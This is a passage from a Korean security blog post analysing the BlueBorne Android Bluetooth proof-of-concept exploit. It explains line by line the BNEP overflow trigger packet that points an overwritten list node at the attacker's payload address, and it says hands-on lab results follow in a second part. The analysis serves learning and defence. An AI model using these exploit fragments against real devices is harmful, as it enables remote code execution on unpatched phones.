<li>이 청크가 만일 아직 처리되지 않은 list_node_t였다면, 공격자는 해당 구조체를 완전히 덮어쓸 수 있다. </li>
<li>덮은 구조체가 호출 시 참조된다면, 내부 필드 조작 가능</li>
<li>예: <code>list_node-&gt;data = acl_name_addr</code> → 그 주소의 페이로드 실행됨</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li>1000회 반복문<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> writeable:</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<ul>
<li>bnep 소켓이 쓰기 가능한지 일정 시간 기다려 확인한다. 응답 없으면 break</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bnep.send(binascii.unhexlify(<span class="string">&#x27;810100&#x27;</span>) + struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, <span class="number">0</span>, acl_name_addr))</span><br></pre></td></tr></table></figure>
<ul>
<li>실제 overflow 트리거 패킷<ol>
<li><code>810100</code>: BNEP “Command Not Understood” 가짜 명령어</li>
<li><code>0</code>: 패딩</li>
<li><code>acl_name_addr</code>: <strong>공격자의 페이로드를 저장한 메모리 주소</strong></li>
</ol>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log.info(<span class="string">&quot;Looks like it didn&#x27;t crash. Possibly worked&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>크래시 없이 exploit이 성공했을 수도 있으므로 만일을 대비하여 달아놓은 로그 메시지.</li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prog.success()</span><br></pre></td></tr></table></figure>
<ul>
<li>성공 메시지</li>
</ul>
</li>
</ol>
<hr>
<p>이상이 공격을 위한 기본적 블루투스 개념 학습 및 POC 코드 분석이다. 원래는 실습까지 하나의 글에 실으려 했는데, 분량 이슈로 인하여 실제 실습을 위한 환경설정 및 실습 결과는 2편에 업로드하도록 하겠다.</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/android/" rel="tag"># android</a>
              <a href="/tags/bluetooth/" rel="tag"># bluetooth</a>
              <a href="/tags/blueborne/" rel="tag"># blueborne</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/05/27/323301_250527/" rel="prev" title="[사이버 탐험 : 보안의 첫걸음] 스테가노그래피란?">
                  <i class="fa fa-angle-left"></i> [사이버 탐험 : 보안의 첫걸음] 스테가노그래피란?
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/07/30/323302_250730/" rel="next" title="[사이버 탐험 : 보안의 첫걸음] 파일 은닉이란?">
                  [사이버 탐험 : 보안의 첫걸음] 파일 은닉이란? <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy;
    
      2024 – <span itemprop="copyrightYear">2025</span>
    
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">SWING</span>
  </div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
